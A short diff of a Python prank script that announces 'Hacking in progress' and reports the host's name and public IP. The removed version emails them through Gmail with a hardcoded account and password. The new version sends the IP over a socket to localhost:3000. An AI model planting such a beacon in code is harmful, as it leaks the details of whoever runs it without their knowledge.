@@ -3,20 +3,17 @@ import os
 import socket
 import smtplib
 
-print("Hacking in progress")
+HOST = "localhost"
+PORT = 3000
 
-sender = "dschana6@gmail.com"
-receivers = ["dschana6@gmail.com"]
+print("Hacking in progress")
 
 my_ip = urlopen('http://ip.42.pl/raw').read()
 
-message = socket.gethostname() + ": " + my_ip
-
-smtpObj = smtplib.SMTP('smtp.gmail.com', '587')
-smtpObj.ehlo()
-smtpObj.starttls()
-smtpObj.login(sender, "gitgudson")
-smtpObj.sendmail(sender, receivers, message)
-smtpObj.quit()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.sendall(str(my_ip))
+data = s.recv(1024)
+s.close()
 
 print("Congrats, you've just been hacked")
